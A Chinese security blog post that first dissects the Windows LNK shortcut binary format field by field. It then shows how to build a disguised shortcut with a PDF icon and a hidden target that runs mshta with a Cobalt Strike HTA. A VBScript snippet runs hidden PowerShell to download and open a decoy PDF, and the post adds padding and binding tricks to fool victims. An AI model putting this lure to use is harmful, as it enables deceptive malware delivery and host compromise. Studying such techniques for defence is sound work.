# LNK文件格式解析及伪装
## 0x01 LNK文件格式解析

文件前20字节固定不变：

[![](_v_images/20200812113111937_17497.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095337-505602b8-d5f5-1.png)

- HeaderSize(4 bytes, `offset 0x00`)：0x0000004C
    
- LinkCLSID(16 bytes, `offset 0x04`)：00021401-0000-0000-C000-000000000046
    

#### 0x01.1 LinkFlags

由`offset 0x14`起始4字节为LinkFlags(下图来自微软官方文档)：

[![](_v_images/20200812113111330_562.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095340-5193fb9e-d5f5-1.png)

由图片2可以看到，该文件LinkFlags为0x000802DB(Bin：0000 0000 0000 1000 0000 0010 1101 1011)，这表示以下Flag被设置：

- HasLinkTargetIDList
- HasLinkInfo
- HasRelativePath
- HasWorkingDir
- HasIconLocation
- IsUnicode
- HasExpIcon
- DisableLinkPathTracking

上述Flag会在下文解释，故此处先不做展开。

#### 0x01.2 FileAttributes

由`offset 0x18`起始4字节为FileAttributes， 0x00000020表示`FILE_ATTRIBUTE_ARCHIVE`。

#### 0x01.3 CreateTime & AccessTime & WriteTime

由`offset 0x1C`开始，每个字段各占8字节：

[![](_v_images/20200812113110008_8010.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095340-520e3d96-d5f5-1.png)

#### 0x01.4 FileSize

由图4可以看到，FileSize为0x000E0400(占4个字节)。

#### 0x01.5 IconIndex

IconIndex为0x00000001(占4个字节)。

#### 0x01.6 ShowCommand & Hotkey

[![](_v_images/20200812113109402_14478.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095341-528b58e4-d5f5-1.png)

由`offset 0x3C`开始，ShowCommand占4字节，0x00000001表示SW_SHOWNORMAL；Hotkey占2字节；余下10个字节均为保留位。

***

#### 0x01.7 LinkTargetIDList

由于LinkFlags中`HasLinkTargetIDList`设为1，故文件包含LinkTargetIDList结构。LinkTargetIDList构成如下：

[![](_v_images/20200812113108794_1143.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095342-5316f1a6-d5f5-1.png)

而IDList由ItemID构成，以2字节全为0的TerminalID作为结束：

[![](_v_images/20200812113107984_31458.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095343-53afdede-d5f5-1.png)

下面来看示例文件中的LinkTargetIDList：

[![](_v_images/20200812113107077_22739.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095344-54543f24-d5f5-1.png)

上图红色部分为IDListSize，绿色部分为TerminalID，中间蓝色部分则为IDList。下面来看IDList，第一个ItemID如下：

- ItemIDSize(2 bytes, offset 0x004E)：0x0014
- Data(12 bytes, offset 0x0050)：根据微软官方文档给出的信息，其含义为computer

第二个ItemID：

[![](_v_images/20200812113106469_6244.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095345-54e991aa-d5f5-1.png)

- ItemIDSize(2 bytes, offset 0x0062)：0x0019
- Data(23 bytes, offset 0x0064)：其含义为c:

第三个ItemID：

[![](_v_images/20200812113105762_25168.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095346-55710680-d5f5-1.png)

不再赘述，其含义为Windows。

第四个ItemID：

[![](_v_images/20200812113105155_13282.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095347-560eb4d4-d5f5-1.png)

其含义为System32。

第五个ItemID：

[![](_v_images/20200812113104547_1724.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095348-5694cd8a-d5f5-1.png)

#### 0x01.8 LinkInfo

由于LinkFlags中`HasLinkInfo`设为1，故文件包含LinkInfo结构。LinkInfo构成如下：

[![](_v_images/20200812113103939_26752.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095349-5728bb12-d5f5-1.png)

下面来看下示例文件中的LinkInfo：

[![](_v_images/20200812113103128_12160.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095350-57b4258a-d5f5-1.png)

- LinkInfoSize(4 bytes, offset 0x017B)：0x00000053
- LinkInfoHeaderSize(4 bytes, offset 0x017F)：LinkInfo结构定义中指定该字段为0x0000001C
- LinkInfoFlags(4 bytes, offset 0x0183)：0x00000001，表示VolumeIDAndLocalBasePath标志位设为1
- VolumeIDOffset(4 bytes, offset 0x0187)：0x0000001C，自`offset 0x017B`处VolumeID偏移大小
- LocalBasePathOffset(4 bytes, offset 0x018B)： 0x00000035，自`offset 0x017B`处LocalBasePath偏移大小
- CommonNetworkRelativeLinkOffset(4 bytes, offset 0x018F)：0x00000000，CommonNetworkRelativeLink不存在
- CommonPathSuffixOffset(4 bytes, offset 0x0193)：0x00000052，自`offset 0x017B`处CommonPathSuffix偏移大小
- VolumeID(25 bytes, offset 0x0197)：由于VolumeIDAndLocalBasePath设置为1，故包含VolumeID结构如下：
    - VolumeIDSize(4 bytes, offset 0x0197)：0x00000019
    - DriveType(4 bytes, offset 0x019B)：DRIVE_FIXED(3)
    - DriveSerialNumber(4 bytes, offset 0x019F)
    - VolumeLabelOffset(4 bytes, offset 0x01A3)：0x00000010，自`offset 0x0197`处VolumeLabel偏移大小
    - Data(9 bytes, offset 0x01A7)：Windows7
- LocalBasePath(29 bytes, offset 0x01B0)：由于VolumeIDAndLocalBasePath设置为1，故包含LocalBasePath——"C:\\Windows\\System32\\calc.exe"。该字段为指向链接目标的完整路径。
- CommonPathSuffix(1 byte, offset 0x01CD)：空字符

#### 0x01.9 String Data

每个String Data结构如下：

[![](_v_images/20200812113102619_9240.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095351-5838dd52-d5f5-1.png)

由于LinkFlags中`HasRelativePath`设为1，故文件包含RELATIVE_PATH字符串：

[![](_v_images/20200812113102113_15612.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095352-58d0b2f8-d5f5-1.png)

红色部分是CountCharacters(Unicode字符串长度，故应该为0x22*2=0x44)，蓝色部分则为String。

之后是WORKING_DIR字符串：

[![](_v_images/20200812113101606_6742.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095353-5952a2c2-d5f5-1.png)

ICON_LOCATION字符串：

[![](_v_images/20200812113101000_15767.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095354-59eb58c8-d5f5-1.png)

#### 0x01.10 EnvironmentVariableDataBlock

由于LinkFlags中`HasExpString`设为1，故文件包含EnvironmentVariableDataBlock：

[![](_v_images/20200812113100392_17408.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095354-5a70d03e-d5f5-1.png)

- BlockSize(4 bytes)：该字段值必须为0x0314
- BlockSignature (4 bytes)：该字段值必须为0xA0000001
- TargetAnsi (260 bytes)：指定环境变量路径(ANSI字符串)，详见下图。

[![](_v_images/20200812113059983_26558.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095355-5af36f6c-d5f5-1.png)

- TargetUnicode(520 bytes)：指定环境变量路径(UNICODE字符串)，详见下图。

[![](_v_images/20200812113059473_18444.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095356-5b726f9c-d5f5-1.png)

#### 0x01.11 EXTRA_DATA

由零个或多个下列数据块与TERMINAL_BLOCK组成：

[![](_v_images/20200812113058762_29542.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095357-5c2d34e4-d5f5-1.png)

示例文件中的EXTRA_DATA包含SpecialFolderDataBlock：

[![](_v_images/20200812113057854_115.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095358-5c9f39f4-d5f5-1.png)

- BlockSize(4 bytes)： 0x00000010
- BlockSignature(4 bytes)： 0xA000005，标识SpecialFolderDataBlock
- SpecialFolderID (4 bytes)：0x00000025，指定Folder ID
- Offset(4 bytes)：0x000000D5，偏移大小，指向IDList中第五个ItemID

KnownFolderDataBlock：

[![](_v_images/20200812113057247_11985.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095359-5d155ea4-d5f5-1.png)

- BlockSize(4 bytes)： 0x0000001C
- BlockSignature(4 bytes)： 0xA00000B，标识KnownFolderDataBlock
- KnownFolderID(16 bytes)：GUID
- Offset(4 bytes)：0x000000D5，偏移大小，指向IDList中第五个ItemID

PropertyStoreDataBlock：

[![](_v_images/20200812113056641_6879.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095400-5dcbd364-d5f5-1.png)

- BlockSize(4 bytes)： 0x000001F4
- BlockSignature(4 bytes)： 0xA000009，标识PropertyStoreDataBlock
- PropertryStore(492 bytes)
    
    TrackerDataBlock：
    

[![](_v_images/20200812113055827_23452.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095401-5e4fadf6-d5f5-1.png)

- BlockSize(4 bytes)： 0x00000060
- BlockSignature(4 bytes)： 0xA000003，标识TrackerDataBlock
- Length(4 bytes)：0x00000058，该数据块最小长度
- Version(4 bytes)：0x00000000
- MachineID(16 bytes)
- Droid(32 bytes)：2 GUID
- DroidBirth(32 byte)：2 GUID

## 0x02 构造迷惑性LNK文件

我们首先生成一个正常的LNK文件：

[![](_v_images/20200812113055119_11689.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095403-5f51ba96-d5f5-1.png)

之后更改其图标为%SystemRoot%\\System32\\SHELL32.dll中任意一个：

[![](_v_images/20200812113054207_21604.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095404-6056524e-d5f5-1.png)

#### 0x02.1 修改图标

用010 Editor打开该LNK文件，找到String Data部分ICON_LOCATION字符串：

[![](_v_images/20200812113053398_3013.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095405-60c06df0-d5f5-1.png)

我们要将其修改为`.\1.pdf`(Unicode)，其长度0x07：

[![](_v_images/20200812113052991_145.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095406-613c245e-d5f5-1.png)

其效果如下所示(左边机器打开PDF文件的默认程序是XODO PDF Reader，中间是Adobe Reader，右边是谷歌浏览器)：

[![](_v_images/20200812113052385_16001.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095407-61e34130-d5f5-1.png)

#### 0x02.2 修改目标

原始目标如下所示：

[![](_v_images/20200812113051877_755.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095408-627d1a62-d5f5-1.png)

现在我们修改EnvironmentVariableDataBlock中的TargetAnsi及TargetUnicode：

[![](_v_images/20200812113051271_25170.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095409-63150692-d5f5-1.png)

[![](_v_images/20200812113050664_10592.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095410-638e090c-d5f5-1.png)

将其修改为`%windir%\system32`目录不存在的一个EXE文件名。

效果展示：

[![](_v_images/20200812113050258_17407.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095410-63f5d762-d5f5-1.png)

但这时双击该文件会报错：

[![](_v_images/20200812113049650_15995.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095412-64a32ef8-d5f5-1.jpg)

所以我们需要再修改LinkTargetIDList中第五个ItemID：

[![](_v_images/20200812113048942_5599.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095413-653f4d88-d5f5-1.png)

如此一来，打开该文件便会弹出计算器：

[![](_v_images/20200812113048335_19514.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095414-662fb0f2-d5f5-1.png)

## 0x03 扩展

首先新建一指向`%windir%\System32\mshta.exe`的快捷方式(文件名尽量带有迷惑性)，并更改其图标为%SystemRoot%\\System32\\SHELL32.dll中任意一个：

[![](_v_images/20200812113047220_30997.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095415-66abf5f4-d5f5-1.png)

之后更改其参数为HTA下载地址：

[![](_v_images/20200812113046497_27893.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095416-6740abc2-d5f5-1.png)

注：笔者是使用Cobalt Strike生成HTA文件：

[![](_v_images/20200812113045788_29928.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095417-67d9372a-d5f5-1.png)

于其执行payload前增加如下 语句：

```
Dim open_pdf
    Set open_pdf = CreateObject("Wscript.Shell")
    open_pdf.run "powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.3.27:8080/1.pdf',$env:temp+'\LNK文件格式解析(修改版).pdf');Start-Process $env:temp'\LNK文件格式解析(修改版).pdf'", 0, true
```

这样一来，在受害者打开LNK文件后会从远程下载一正常PDF文档并打开。

接下来按照0x02部分所述方法修改即可，此处加一个Tip——在其WORKING_DIR字符串前面添加大量空格字符，使其目标长度超过260个字符：

[![](_v_images/20200812113045181_18937.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095418-68825b02-d5f5-1.png)

使用`copy \B`命令将其与正常PDF文档捆绑，使其文件大小看起来更具有说服力：

[![](_v_images/20200812113044470_24230.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095419-69065d94-d5f5-1.png)

之后双击该LNK文件，主机便会上线，而受害者会看到一正常的PDF文档：

[![](_v_images/20200812113043851_10752.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200804095421-69fb6c3a-d5f5-1.png)

效果展示：

[![](_v_images/20200812113042921_14006.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20200726095114-7d47c532-cee2-1.gif)